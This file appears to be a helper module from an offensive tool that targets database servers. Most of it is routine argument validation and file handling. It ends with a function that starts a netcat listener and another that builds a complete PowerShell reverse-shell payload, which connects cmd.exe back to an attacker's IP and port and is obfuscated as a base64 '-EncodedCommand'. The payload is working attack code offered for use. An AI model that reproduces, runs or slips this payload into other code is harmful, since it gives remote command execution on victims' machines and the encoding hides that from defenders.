#!/usr/bin/python
# -*- coding: utf-8 -*-

from progressbar import *
from datetime import datetime
import logging, os, random
from socket import gethostbyname
from socket import inet_aton
import subprocess
import base64

def cleanString(strg):
	'''
	Return the strg string without \t, \n and \r
	'''
	return strg.replace('\n','').replace('\r','').replace('\t','')
	
class ErrorClass(Exception):
	'''
	Error class
	'''
	def __init__(self, e):
		'''
		Contructor
		'''
		self.errormsg = str(e)

	def __str__(self):
		'''
		Return the error like a string
		'''
		return repr(cleanString(str(self.errormsg)))
		
def getStandardBarStarted(maxvalue):
		"""Standard status bar"""
		return ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=maxvalue).start()

def generateUniqueName ():
	'''
	Genere un nom de fichier unique à partir de la date et heure courante
	'''
	return datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
	
def databaseHasBeenGiven(args):
	'''
	Return True if a sid has been given
	Otherwise return False
	- args must be a dictionnary
	'''
	if ('database' in args) == False or args['database'] == None:
		logging.critical("The database must be given thanks to the '-d DATABASE' option.")
		return False
	return True
	
def ipOrNameServerHasBeenGiven(args):
	'''
	Return True if an ip or name server has been given
	Otherwise return False
	- args must be a dictionnary
	'''
	if ('host' in args) == False or args['host'] == None:
		logging.critical("The server addess must be given thanks to the '-s IPadress' option.")
		return False
	else :
		try:
			inet_aton(args['host'])
		except Exception as e:
			try:
				ip = gethostbyname(args['host'])
				args['host'] = ip
			except Exception as e:
				logging.critical("There is an error with the name server or ip address: '{0}'".format(e))
				return False
	return True
	
def anAccountIsGiven (args):
	'''
	return True if an account is given in args
	Otehrwise, return False
	- oeprations muste be a list
	- args must be a dictionnary
	'''
	if args['user'] == None and args['password'] == None:
		logging.critical("You must give a valid account with the '-U username' option and the '-P password' option.")
		return False
	elif args['user'] != None and args['password'] == None:
		logging.critical("You must give a valid account with the '-P password' option.")
		return False
	elif args['user'] == None and args['password'] != None:
		logging.critical("You must give a valid username thanks to the '-U username' option.")
		return False
	else :
		return True
		
def anOperationHasBeenChosen(args, operations):
	'''
	Return True if an operation has been choosing.
	Otherwise return False
	- oeprations must be a list
	- args must be a dictionnary
	'''
	if ('test-module' in args)==True and args['test-module'] == True : return True
	for key in operations:
		if (key in args) == True:
			if args[key] != None and args[key] != False : return True
	logging.critical("An operation on this module must be chosen thanks to one of these options: --{0};".format(', --'.join(operations)))
	return False
	
def checkOptionsGivenByTheUser(args,operationsAllowed,checkAccount=True, allowHostsFile=False):
	'''
	Return True if all options are OK
	Otherwise return False
	- args: list
	- operationsAllowed : opertaions allowed with this module
	'''
	if allowHostsFile == True:
		if args['hostlist'] == None and ipOrNameServerHasBeenGiven(args) == False: 
			return False
	elif ipOrNameServerHasBeenGiven(args) == False : return False
	elif checkAccount==True and anAccountIsGiven(args) == False : return False
	elif anOperationHasBeenChosen(args,operationsAllowed) == False : return False
	return True
	
def getDataFromFile(filename):
	'''
	Return data stored in a filename
	'''
	logging.info ("Loading data stored in the file {0}".format(filename))
	f = open(filename)
	data = f.read()
	f.close()
	logging.debug("Data has been loaded from {0}".format(filename))
	return data[:-1]

def getBinaryDataFromFile(filename):
	'''
	Return data stored in a filename
	'''
	logging.info ("Loading data stored in the file {0}".format(filename))
	f = open(filename,'rb')
	data = f.read()
	f.close()
	logging.debug("Data has been loaded from {0}".format(filename))
	return data
	
def putDataToFile(data, filename):
	'''
	Put data to the local file filename
	'''
	logging.info ("Writing data to the file {0}".format(filename))
	f = open(filename,'w')
	f.write(data)
	logging.debug("Data has been written in {0}".format(filename))
	f.close()
	return True

def getScreenSize ():
	'''
	Returns screen size (columns, lines)
	'''
	columns, rows  = os.popen('stty size', 'r').read().split()
	return (int(rows), int(columns))
	
def getCredentialsFormated(dico):
	'''
	dico ex: {'user1': 'pwd1', 'user2': 'pwd2'}
	returns a string
	'''
	stringV = "\n"
	for aLogin in dico: stringV += "{0}/{1}\n".format(aLogin, dico[aLogin])
	return stringV


def runListenNC(port):
	'''
	nc listen on the port
	'''
	NC_CMD = "nc -l  -n -v {0}"  # {0} port #-n numeric-only IP addresses, no DNS
	ncCmd = NC_CMD.format(port)
	try :
		logging.info('Listening for a remote connection on the local port {0} with the command "{1}"'.format(port, ncCmd))
		subprocess.call(ncCmd, shell=True)
	except KeyboardInterrupt:
		logging.info("Connection closed locally")
		pass

def getPSReverseShellCodeEncoded(ip, port):
	'''
	Return the Powershell Reverse shell code. Reverse shell will connect to ip and port. nc listening is required
	for getting connection back. Return encoded with utf16-LE + base64
	'''
	R_SHELL_COMMAND_POWERSHELL = "powershell.exe -EncodedCommand {0}"  # {0} powershell code base64 encoded
	R_SHELL_COMMAND_POWERSHELL_PAYLOAD = 'function ReverseShellClean {{if ($c.Connected -eq $true) {{$c.Close()}}; if ($p.ExitCode -ne $null) {{$p.Close()}}; exit; }};$a="{0}"; $port="{1}";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){{$out += $e.GetString($os.Read())}} $s.Write($e.GetBytes($out),0,$out.Length);$out=$null;$done=$false;while (-not $done) {{if ($c.Connected -ne $true) {{cleanup}} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {{ $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {{break}}}}  if ($pos -gt 0){{ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {{ReverseShellClean}} else {{  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){{ $out += $e.GetString($os.Read());if ($out -eq $string) {{$out=" "}}}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}}}} else {{ReverseShellClean}}}};'  # {0} IP, {1} port
	payload = R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(ip, port)
	logging.debug("payload: {0}".format(repr(payload)))
	utf16LEPayloadBytes = payload.encode('UTF-16LE')
	logging.debug("Payload encoded with UTF16-LE: {0}".format(repr(utf16LEPayloadBytes)))
	cmdAndPayloadBytes = R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode(utf16LEPayloadBytes).decode('ascii'))
	logging.debug("Full Powershell Command (encoded): {0}".format(repr(cmdAndPayloadBytes)))
	return cmdAndPayloadBytes